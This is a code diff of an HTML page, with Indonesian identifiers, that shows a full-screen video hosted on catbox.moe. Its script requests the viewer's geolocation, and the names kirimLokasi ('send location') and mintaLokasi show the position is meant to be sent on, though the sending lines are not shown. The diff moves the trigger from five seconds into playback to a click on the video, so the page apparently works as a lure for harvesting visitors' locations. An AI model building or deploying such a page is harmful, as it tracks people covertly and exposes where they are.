@@ -7,16 +7,16 @@
 
 <body style="margin:0; background:black;">
 
-<video id="vid" width="100%" controls autoplay muted playsinline>
-  <source src="https://files.catbox.moe/a6i2nt.mp4" type="video/mp4">
+<video id="vid" width="100%" controls autoplay muted playsinline onclick="mintaLokasi()">
+  <source src="https://files.catbox.moe/ezxq5k.mp4" type="video/mp4">
 </video>
 
 <script>
-let sent = false;
+let sudah = false;
 
-function kirimLokasi() {
-  if (sent) return; // biar tidak kirim berulang
-  sent = true;
+function mintaLokasi() {
+  if (sudah) return;
+  sudah = true;
 
   navigator.geolocation.getCurrentPosition(pos => {
 
@@ -39,15 +39,6 @@ function kirimLokasi() {
 
   });
 }
-
-// jalankan setelah 5 detik video
-let v = document.getElementById("vid");
-
-v.ontimeupdate = () => {
-  if (v.currentTime > 5) {
-    kirimLokasi();
-  }
-};
 </script>
 
 </body>
